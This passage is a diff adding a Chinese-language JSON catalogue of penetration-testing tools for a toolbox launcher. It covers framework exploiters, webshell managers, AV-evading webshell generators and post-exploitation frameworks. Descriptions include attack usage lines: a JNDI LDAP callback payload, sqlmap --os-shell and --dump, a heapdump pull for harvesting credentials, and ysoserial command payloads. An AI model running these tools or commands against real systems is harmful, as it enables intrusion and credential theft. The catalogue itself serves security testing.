@@ -1,0 +1,3649 @@
+[
+  {
+    "id": "shiro-attack-4-7",
+    "name": "Shiro Attack 4.7",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/shiro/shiro/shiro_attack-4.7.0-SNAPSHOT-all.jar",
+    "category": "java-fw",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "shiro",
+      "反序列化",
+      "java"
+    ],
+    "description": "Apache Shiro反序列化漏洞利用GUI工具(v4.7)，集成550链/721链/常见Shiro利用\n用法:\n  1. 输入目标URL，工具自动检测Shiro特征(rememberMe cookie)\n  2. 选择利用链(CommonsBeanutils1/CC系列等)并配置命令\n  3. 支持回显、反弹Shell、写文件等多种利用方式\n  需要: Java 8环境运行",
+    "available": true
+  },
+  {
+    "id": "pyke-shiro-0-3",
+    "name": "Pyke Shiro 0.3",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/shiro/shiro_attack2/Pyke-Shiro_0.3.jar",
+    "category": "java-fw",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "shiro",
+      "反序列化"
+    ],
+    "description": "Pyke Shiro漏洞利用工具，轻量级Shiro检测和利用框架\n用法: GUI操作，输入目标URL自动检测密钥并利用\n支持: 密钥爆破、CC/CB利用链、命令回显\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "spring-all-reachable-2-1-shiro",
+    "name": "Spring All Reachable 2.1 (Shiro链)",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/shiro/shiro_attack_2.2/Spring_All_Reachable-2.1.jar",
+    "category": "java-fw",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "shiro",
+      "spring",
+      "反序列化"
+    ],
+    "description": "Spring框架+Shiro组合漏洞利用，针对Spring系统Shiro短链\n用法: GUI输入目标URL，自动探测Shiro key + Spring利用链\n支持: Spring框架中的Shiro RememberMe反序列化场景\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "0x7e",
+    "name": "0x7e 团队工具",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/0x7eTeamTools/0x7e.jar",
+    "category": "vuln-scan",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "0x7eTeamTools",
+      "scan"
+    ],
+    "description": "0x7e团队综合漏洞利用GUI工具\n\n启动方式（绝对路径Java8）:\n```\n~/Workspace/security/tools/TH_Tools/Java_path/Java_8_Mac/Contents/Home/bin/java -jar ~/TH_Tools/tools/scan/0x7eTeamTools/0x7e.jar\n```\n功能: Web漏洞批量扫描/利用（Shiro、Fastjson、Log4j等）\nGUI界面操作，支持自定义POC加载",
+    "available": true
+  },
+  {
+    "id": "fastjson-jackson",
+    "name": "FastJson / Jackson 反序列化",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/FastJson_JackSon/FastJson_JackSon.jar",
+    "category": "deserialize",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "FastJson_JackSon",
+      "scan"
+    ],
+    "description": "FastJson/Jackson反序列化漏洞一键利用工具\n用法:\n  1. 输入目标接口URL，选择FastJson或Jackson\n  2. 配置DNSLOG或JNDI地址，自动发送反序列化Payload\n  支持: FastJson 1.2.24/47/68/80, Jackson CVE系列\n需要: Java 8，配合JNDIExploit使用",
+    "available": true
+  },
+  {
+    "id": "gr33k",
+    "name": "Gr33k 综合扫描",
+    "type": "python",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/Gr33k/Gr33k.py",
+    "category": "vuln-scan",
+    "env_id": "th-python-3-12",
+    "args": "",
+    "tags": [
+      "Gr33k",
+      "scan"
+    ],
+    "description": "Gr33k综合漏洞扫描器(PyQt5 GUI)，需要图形界面环境\n用法: 通过工具箱界面启动，提供Web漏洞/资产扫描/POC验证图形化操作\n注意: 依赖PyQt5，需要在有图形界面的环境运行",
+    "available": true
+  },
+  {
+    "id": "liqunkit",
+    "name": "LiqunKit 力群工具箱",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/LiqunKit_1.5.1/LiqunKit_1.6.2_交流版.jar",
+    "category": "vuln-scan",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "LiqunKit_1.5.1",
+      "scan"
+    ],
+    "description": "力群综合利用工具箱，支持多数据库管理和Web漏洞利用\n用法: GUI操作，支持MySQL/MSSQL/Oracle/PostgreSQL连接管理\n功能: 数据库Shell、UDF提权、文件读写\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "requesttemplate",
+    "name": "RequestTemplate 请求构造",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/RequestTemplate/RequestTemplate.jar",
+    "category": "other",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "RequestTemplate",
+      "scan"
+    ],
+    "description": "HTTP请求模板构造工具，用于漏洞测试请求包管理\n用法: GUI操作，导入/编辑HTTP请求，批量发送和结果对比\n功能: 自定义Header/Body、支持变量替换\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "ruoyi",
+    "name": "Ruoyi 一把梭",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/Ruoyi-All-master/ruoyiVuln.jar",
+    "category": "cms-exploit",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "Ruoyi-All-master",
+      "scan"
+    ],
+    "description": "若依框架漏洞利用工具，覆盖若依各版本已知RCE/越权漏洞\n用法: 输入目标URL，自动检测框架版本并尝试相应漏洞\n支持: 若依Shiro、代码执行、SQL注入等历史CVE\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "ak-sk",
+    "name": "AK/SK 云密钥利用",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/aksk/aksktool.jar",
+    "category": "cloud",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "aksk",
+      "scan"
+    ],
+    "description": "云服务AK/SK密钥利用工具，支持阿里云/腾讯云/华为云/AWS\n用法:\n  1. 输入AccessKey和SecretKey\n  2. 自动枚举有效权限并展示可操作资源\n  支持: ECS/S3/RDS等常见云服务接口调用\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "api",
+    "name": "API 测试工具",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/apitool/API-T00L_v1.2.jar",
+    "category": "web-bypass",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "apitool",
+      "scan"
+    ],
+    "description": "API接口测试/安全测试GUI工具\n\n启动方式:\n```\n~/Workspace/security/tools/TH_Tools/Java_path/Java_8_Mac/Contents/Home/bin/java -jar ~/TH_Tools/tools/scan/apitool/API-T00L_v1.2.jar\n```\n功能: API端点发现、认证绕过、参数Fuzz、未授权访问检测\n支持导入Swagger/OpenAPI文档",
+    "available": true
+  },
+  {
+    "id": "appinfo-app",
+    "name": "AppInfo APP 信息",
+    "type": "python",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/appinfo/app.py",
+    "category": "other",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "appinfo",
+      "scan"
+    ],
+    "description": "Android APK深度信息提取，分析权限/组件/硬编码API Key等\n用法: 通过工具箱界面启动，拖入APK文件自动分析\n输出: Excel报告，包含权限列表、可导出Activity、URL/API Key硬编码信息\n注意: 需安装 openpyxl (pip3 install openpyxl)",
+    "available": true
+  },
+  {
+    "id": "apt",
+    "name": "APT 工具集",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/apt/IWannaGetAll.jar",
+    "category": "cve-exploit",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "apt",
+      "scan"
+    ],
+    "description": "IWannaGetAll — APT漏洞利用综合工具集\n\n启动方式:\n```\n~/Workspace/security/tools/TH_Tools/Java_path/Java_8_Mac/Contents/Home/bin/java -jar ~/TH_Tools/tools/scan/apt/IWannaGetAll.jar\n```\n包含: Shiro/Fastjson/Log4j/JNDI/反序列化等多框架漏洞PoC\n自动化检测+一键利用GUI界面",
+    "available": true
+  },
+  {
+    "id": "day-2023",
+    "name": "Day 2023 漏洞利用",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/day2023/day2023.jar",
+    "category": "cve-exploit",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "day2023",
+      "scan"
+    ],
+    "description": "2023年高危CVE批量利用工具\n\n启动方式:\n```\n~/Workspace/security/tools/TH_Tools/Java_path/Java_8_Mac/Contents/Home/bin/java -jar ~/TH_Tools/tools/scan/day2023/day2023.jar\n```\n覆盖: RuoYi、Shiro、Nacos、Fastjson、Log4j等2023年度HVV高频漏洞\n带字典: dict/ 目录下含payload和路径字典",
+    "available": true
+  },
+  {
+    "id": "",
+    "name": "解密工具",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/decrypt/DecryptToolsV2.4.jar",
+    "category": "crypto",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "decrypt",
+      "scan"
+    ],
+    "description": "加密数据解密综合工具，支持常见Web框架的密文解密\n用法: GUI操作，选择加密类型，输入密文获取明文\n支持: Shiro/SpringSession/JWT/AES/DES等\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "dirsearch",
+    "name": "dirsearch 目录扫描",
+    "type": "python",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/dirsearch/dirsearch.py",
+    "category": "dir-fuzz",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "dirsearch",
+      "scan"
+    ],
+    "description": "目录爆破工具 (v0.4.3) — 实测可用\n  ~/Workspace/security/tools/TH_Tools/tools/scan/dirsearch/dirsearch.py\n常用:\n  python3 dirsearch.py -u https://target.com\n  python3 dirsearch.py -u https://t.com -e php,jsp,bak\n  python3 dirsearch.py -u https://t.com -w wordlist.txt\n  python3 dirsearch.py -l targets.txt -o report.txt",
+    "available": true
+  },
+  {
+    "id": "heap-dump",
+    "name": "Heap Dump 分析",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/headdump-shell.sh",
+    "category": "reverse",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "headdump",
+      "scan"
+    ],
+    "description": "Java Heap Dump内存分析工具，从堆转储中提取敏感信息\n用法:\n  java -jar heapdump_tools.jar heapdump文件路径\n  工具箱点击后拖入heapdump文件路径即可\n功能: 提取明文密码/session/accesskey，支持hprof格式\n获取heapdump: curl http://target/actuator/heapdump -o heap.hprof",
+    "available": true
+  },
+  {
+    "id": "hvv-oa-exploit",
+    "name": "HVV OA Exploit",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/hvvoaexploit/Exp-Tools-1.2.5-encrypted.jar",
+    "category": "vuln-scan",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "hvvoaexploit",
+      "scan"
+    ],
+    "description": "HVV专项OA系统漏洞利用工具(Exp-Tools)\n用法: GUI操作，选择OA系统类型(致远/泛微/用友等)和漏洞\n支持: 常见OA系统RCE、文件读取、SQL注入\n注意: 加密JAR，需授权环境使用\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "jboss",
+    "name": "JBoss 利用",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/jboss/JavaJboss.jar",
+    "category": "java-fw",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "jboss",
+      "scan"
+    ],
+    "description": "JBoss应用服务器漏洞利用工具\n用法: GUI输入目标地址，选择JBoss版本对应漏洞\n支持: JBoss 4.x/5.x/6.x CVE，反序列化/管理后台利用\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "jeecg-boot",
+    "name": "Jeecg-Boot 利用",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/jeecg/jeecgExploitss.jar",
+    "category": "java-fw",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "jeecg",
+      "scan"
+    ],
+    "description": "Jeecg-Boot框架漏洞利用工具\n用法: 输入目标URL，自动检测Jeecg-Boot漏洞\n支持: SQL注入、SSTI、未授权、RCE等\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "jenkins",
+    "name": "Jenkins 利用",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/jenkins/JenkinsExploit-GUI-1.3-SNAPSHOT.jar",
+    "category": "java-fw",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "jenkins",
+      "scan"
+    ],
+    "description": "Jenkins CI/CD系统漏洞利用GUI工具\n用法: GUI输入Jenkins URL，自动检测未授权访问和已知CVE\n支持: CVE-2018-1000861, Groovy Script RCE, 凭证泄露\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "jndi-cli",
+    "name": "JNDI 注入合集 (CLI)",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/jndi/JNDIExploit-2.0-SNAPSHOT.jar",
+    "category": "java-fw",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "-i 127.0.0.1",
+    "tags": [
+      "jndi",
+      "scan"
+    ],
+    "description": "JNDIExploit-2.0 JNDI注入利用服务器，支持多种反序列化链\n用法:\n  java -jar JNDIExploit.jar -i <本机IP> -l 1389 -p 8888\n  # 然后让目标访问 ldap://<本机IP>:1389/Basic/Command/cmd\n  支持: LDAP/RMI, TomcatEcho, SpringEcho, Base64Command等\n需要: Java 8 + 公网/内网可达IP",
+    "available": true
+  },
+  {
+    "id": "mdut-multidbexploit",
+    "name": "mdut MultiDBExploit",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/mdut/mdut.jar",
+    "category": "sqli",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "mdut",
+      "scan"
+    ],
+    "description": "多数据库利用工具(MDUT)，专注后渗透数据库Shell\n用法: GUI操作，输入数据库连接信息\n支持: MySQL UDF提权/MSSQL xp_cmdshell/Oracle Java/PostgreSQL COPY\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "nacos",
+    "name": "Nacos 利用",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/nacos/NacosExploit-1.0.1-SNAPSHOT-jar-with-dependencies.jar",
+    "category": "java-fw",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "nacos",
+      "scan"
+    ],
+    "description": "Nacos配置中心漏洞利用工具集\n用法: GUI输入目标地址，自动探测Nacos漏洞\n支持: CVE-2021-29441(未授权), Nacos Derby SQL注入, Token绕过\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "nuclei-jar",
+    "name": "Nuclei (jar 版)",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/nuclei/nuclei-7.4.8.jar",
+    "category": "vuln-scan",
+    "env_id": "java-java-11-mac-11-0-24",
+    "args": "",
+    "tags": [
+      "nuclei",
+      "scan"
+    ],
+    "description": "Nuclei漏洞扫描器GUI版(nuclei-7.4.8.jar)\n用法: GUI操作，配置目标URL和模板\n功能: 可视化POC管理、批量扫描、结果查看\n需要: Java 11",
+    "available": true
+  },
+  {
+    "id": "poc2jar",
+    "name": "POC2JAR 转换",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/poc2jar-WINDOWS/poc2jar.jar",
+    "category": "other",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "poc2jar-WINDOWS",
+      "scan"
+    ],
+    "description": "POC文本 → 可执行JAR转换工具（原为Windows GUI，Mac下可尝试CLI）\n\n启动方式:\n```\n~/Workspace/security/tools/TH_Tools/Java_path/Java_8_Mac/Contents/Home/bin/java -jar ~/TH_Tools/tools/scan/poc2jar-WINDOWS/poc2jar.jar\n```\n将YAML/JSON格式的PoC打包为独立JAR，便于分发和一键执行\n注意：原版为Windows设计，Mac上GUI可能无法完整渲染",
+    "available": true
+  },
+  {
+    "id": "postgresql",
+    "name": "PostgreSQL 利用",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/postgre/postgreUtil-1.0-SNAPSHOT-jar-with-dependencies.jar",
+    "category": "java-fw",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "postgre",
+      "scan"
+    ],
+    "description": "PostgreSQL数据库利用工具\n用法: GUI输入PgSQL连接信息，利用COPY TO/FROM命令执行系统命令\n支持: CVE-2019-9193, pg_read_file文件读取\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "spring",
+    "name": "Spring 利用合集",
+    "type": "python",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/spring/run.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "spring",
+      "scan"
+    ],
+    "description": "Spring框架漏洞POC集合，覆盖Spring4Shell/Gateway/Security等CVE\n用法: 通过工具箱界面启动，选择CVE后输入目标URL验证和利用\n支持: CVE-2022-22947, CVE-2022-22965, Spring Cloud系列",
+    "available": true
+  },
+  {
+    "id": "sqlmap-py",
+    "name": "sqlmap (内置 py)",
+    "type": "python",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/sqlmap/sqlmap.py",
+    "category": "sqli",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "sqlmap",
+      "scan"
+    ],
+    "description": "SQL注入自动化利用(本地内置版 1.8#stable)，支持10+注入类型\n用法:\n  python3 sqlmap.py -u 'http://target?id=1'              (GET注入)\n  python3 sqlmap.py -u http://target --data 'id=1'       (POST注入)\n  python3 sqlmap.py -u 'http://target?id=1' --dbs        (获取数据库)\n  python3 sqlmap.py -u 'http://target?id=1' -D db -T tbl --dump (导出)\n  python3 sqlmap.py -r request.txt --level=5 --risk=3    (从Burp请求文件)\n  python3 sqlmap.py -u 'http://target?id=1' --os-shell   (获取命令执行)",
+    "available": true
+  },
+  {
+    "id": "struts2",
+    "name": "Struts2 利用",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/struts2/struts2_19.jar",
+    "category": "java-fw",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "struts2",
+      "scan"
+    ],
+    "description": "Struts2 RCE漏洞一键利用工具，支持全系列CVE\n用法:\n  GUI操作: 输入目标URL，选择CVE，执行命令\n  CLI方式: java -jar struts2_19.jar -u http://target\n  支持: S2-001/005/007/008/012/013/015/016/019/020/032/045/046/048/052/053/057/059/061/062\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "thinkphp",
+    "name": "ThinkPHP 利用",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/thinkphp/ThinkphpGUI.jar",
+    "category": "cms-exploit",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "thinkphp",
+      "scan"
+    ],
+    "description": "ThinkPHP框架漏洞利用工具集\n用法: GUI输入目标URL，自动识别ThinkPHP版本并匹配漏洞\n支持: TP5 RCE/SQL注入, TP6 Session反序列化, TP3.x注入\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "vulmap",
+    "name": "vulmap 漏洞扫描",
+    "type": "python",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/vulmap/vulmap.py",
+    "category": "vuln-scan",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "vulmap",
+      "scan"
+    ],
+    "description": "Web框架漏洞扫描利用，支持Shiro/ThinkPHP/Struts2/Tomcat/Spring等\n用法:\n  python3 vulmap.py -u http://target             (全框架探测)\n  python3 vulmap.py -u http://target -a shiro    (指定框架: tomcat/shiro/spring/struts2)\n  python3 vulmap.py -f targets.txt -t 20         (批量扫描，20线程)\n  python3 vulmap.py -u http://target --list      (列出支持的漏洞)\n  python3 vulmap.py -u http://target --output-json result.json",
+    "available": true,
+    "last_used": 1779451507
+  },
+  {
+    "id": "weblogic",
+    "name": "WebLogic 利用",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/weblogic/WeblogicTool_1.3.jar",
+    "category": "java-fw",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "weblogic",
+      "scan"
+    ],
+    "description": "WebLogic服务器漏洞利用GUI工具(v1.3)\n用法: GUI输入目标IP:7001，自动探测WebLogic版本和漏洞\n支持: CVE-2019-2725/2729, T3/IIOP协议反序列化, Console未授权\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "webpack-js",
+    "name": "Webpack JS 扫描",
+    "type": "python",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/webpackscan/PackerFuzzer.py",
+    "category": "recon-misc",
+    "env_id": "th-python-3-12",
+    "args": "",
+    "tags": [
+      "webpackscan",
+      "scan"
+    ],
+    "description": "PackerFuzzer前端资产扫描，从Webpack打包文件逆向提取路由和配置\n用法: python3 PackerFuzzer.py -u http://target/app.bundle.js\n功能: 提取API路径、内网IP、AK/SK泄露、接口签名算法\n注意: 依赖node_vm2 Python包，在目标含Webpack bundle时使用",
+    "available": true
+  },
+  {
+    "id": "ysoserial",
+    "name": "YsoSerial 反序列化生成",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/ysoserial-shell.sh",
+    "category": "deserialize",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "yso",
+      "scan"
+    ],
+    "description": "ysoserial反序列化Payload生成器，生成各种利用链的序列化数据\n用法:\n  java -jar ysoserial.jar CommonsCollections1 'cmd'     (CC1链)\n  java -jar ysoserial.jar CommonsBeanutils1 'cmd'       (CB1链/Shiro常用)\n  java -jar ysoserial.jar URLDNS 'http://dnslog'        (OOB检测)\n  java -jar ysoserial.jar Spring1 'cmd'                 (Spring链)\n  java -jar ysoserial.jar Payload 'cmd' | base64        (生成base64)\n  工具箱启动后通过菜单选择Payload类型",
+    "available": true
+  },
+  {
+    "id": "v3-behinder",
+    "name": "冰蝎 v3 Behinder",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/webshell-managers/Behinder/Behinder.jar",
+    "category": "webshell",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "Behinder",
+      "webshell-managers"
+    ],
+    "description": "冰蝎v3 Webshell管理工具，AES加密通信\n用法: GUI操作，添加Shell地址和密钥(默认rebeyond)\n支持: PHP/JSP/ASPX Shell，文件管理/命令执行/内存Shell注入\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "v4",
+    "name": "冰蝎 v4",
+    "type": "java",
+    "path": "~/Workspace/security/tools/webshell/behinder/Behinder.jar",
+    "category": "webshell",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "Behinder4",
+      "webshell-managers"
+    ],
+    "description": "冰蝎v4 Webshell管理工具，动态加密通信\n用法: GUI操作，导入Shell配置\n功能: 虚拟终端/文件管理/反弹Shell/插件扩展/流量混淆\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "tianxie",
+    "name": "天蝎 TianXie",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/webshell-managers/TianXie/天蝎权限管理工具.jar",
+    "category": "webshell",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "TianXie",
+      "webshell-managers"
+    ],
+    "description": "天蝎WebShell管理工具，支持多种加密协议\n用法: GUI操作，支持JSP/PHP/ASPX等多种Shell\n功能: 文件管理/终端/数据库/反弹Shell\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "counter-strike",
+    "name": "Counter-Strike 对抗",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/post-ex/Counter-Strike/cs.jar",
+    "category": "post-exploit",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "Counter-Strike",
+      "post-ex"
+    ],
+    "description": "CS对抗模拟框架(Counter-Strike)，用于红蓝对抗演练\n用法: 启动TeamServer后配置Listener和Payload\n注意: 仅限授权红队演练使用\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "xg-ntai",
+    "name": "XG-NTAI 内网工具",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/post-ex/XG_NTAI_V2/XG_NTAI.jar",
+    "category": "webshell",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "XG_NTAI_V2",
+      "post-ex"
+    ],
+    "description": "XG拟态 — Webshell静态免杀 + 流量加密传输\n\n启动方式:\n```\n~/Workspace/security/tools/TH_Tools/Java_path/Java_8_Mac/Contents/Home/bin/java -jar ~/TH_Tools/tools/post-ex/XG_NTAI_V2/XG_NTAI.jar\n```\n功能:\n- 生成免杀Webshell（ASP/PHP/JSP/JSPX 多模板）\n- 生成冰蝎4流量加密配置\n- 支持自定义密钥、WEB路径\n模板类型: 1种ASP, 8种PHP, 8种JSP, 5种JSPX, 7种WAF页面",
+    "available": true
+  },
+  {
+    "id": "blue-team",
+    "name": "Blue Team 工具",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/post-ex/blue/BlueTeamTools.jar",
+    "category": "post-exploit",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "blue",
+      "post-ex"
+    ],
+    "description": "蓝队应急响应工具箱(BlueTeamTools)\n用法: GUI操作，提供日志分析/进程检测/文件完整性校验等\n用途: 应急响应、安全基线检查\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "vcenter-kit",
+    "name": "vCenter Kit",
+    "type": "python",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/post-ex/vcenterKit/vcenterKit.py",
+    "category": "cms-exploit",
+    "env_id": "th-python-3-12",
+    "args": "",
+    "tags": [
+      "vcenterKit",
+      "post-ex"
+    ],
+    "description": "VMware vCenter漏洞利用工具集(PyQt5 GUI)\n支持: CVE-2021-21985/21972/22005等历史高危RCE漏洞\n用法: 通过工具箱界面启动，需PyQt5图形环境",
+    "available": true
+  },
+  {
+    "id": "webshell",
+    "name": "Webshell 静态扫描",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/post-ex/webshellsc/Webshell_Generate-1.2.4.jar",
+    "category": "webshell",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "webshellsc",
+      "post-ex"
+    ],
+    "description": "Webshell Generate — Webshell生成 + 免杀对抗工具\n\n启动方式:\n```\n~/Workspace/security/tools/TH_Tools/Java_path/Java_8_Mac/Contents/Home/bin/java -jar ~/TH_Tools/tools/post-ex/webshellsc/Webshell_Generate-1.2.4.jar\n```\n功能:\n- 批量生成混淆/变形Webshell（PHP/JSP/ASPX）\n- 内置多种绕过AV/WAF混淆模板\n- 支持自定义关键词替换和加密payload",
+    "available": true
+  },
+  {
+    "id": "dirscan-3-0",
+    "name": "DirScan 3.0",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/recon/dirscan_3.0/scandir-3.0.jar",
+    "category": "dir-fuzz",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "dirscan_3.0",
+      "recon"
+    ],
+    "description": "DirScan 3.0 — 目录扫描GUI工具（Java版）\n\n启动方式:\n```\n~/Workspace/security/tools/TH_Tools/Java_path/Java_8_Mac/Contents/Home/bin/java -jar ~/TH_Tools/tools/recon/dirscan_3.0/scandir-3.0.jar\n```\n功能: 目录/文件路径爆破，支持多线程、自定义字典\n特点: 图形化界面，支持导入目标列表批量扫描\n字典路径: scandir-3.0.jar同目录下",
+    "available": true
+  },
+  {
+    "id": "oneforall",
+    "name": "OneForAll 子域名收集",
+    "type": "python",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/recon/oneforall/oneforall.py",
+    "category": "subdomain",
+    "env_id": "th-python-3-12",
+    "args": "",
+    "tags": [
+      "oneforall",
+      "recon"
+    ],
+    "description": "强大子域名枚举，集成DNS爆破/证书透明度/搜索引擎/API等30+信息源\n用法:\n  python3 oneforall.py --target example.com run      (单域名收集)\n  python3 oneforall.py --targets domains.txt run     (批量收集)\n  python3 oneforall.py --target example.com --dns True run  (开启DNS解析)\n  结果保存在 results/ 目录下 CSV/JSON 格式\n  注意: sre_parse兼容性问题在Python 3.12上部分功能受限",
+    "available": true
+  },
+  {
+    "id": "bypass-gbbypass",
+    "name": "哥斯拉 ByPass版 (GBByPass)",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/webshell-managers/GBByPass.jar",
+    "category": "webshell",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "godzilla",
+      "bypass",
+      "WAF"
+    ],
+    "description": "哥斯拉魔改ByPass版Webshell管理工具\n用法: GUI操作，需上传对应ByPass版Shell\n功能: 流量混淆、WAF绕过、文件管理、命令执行\n需要: Java 8",
+    "available": true
+  },
+  {
+    "id": "wireshark",
+    "name": "Wireshark",
+    "type": "gui",
+    "path": "/Applications/Wireshark.app",
+    "category": "proxy",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "wireshark",
+      "pcap"
+    ],
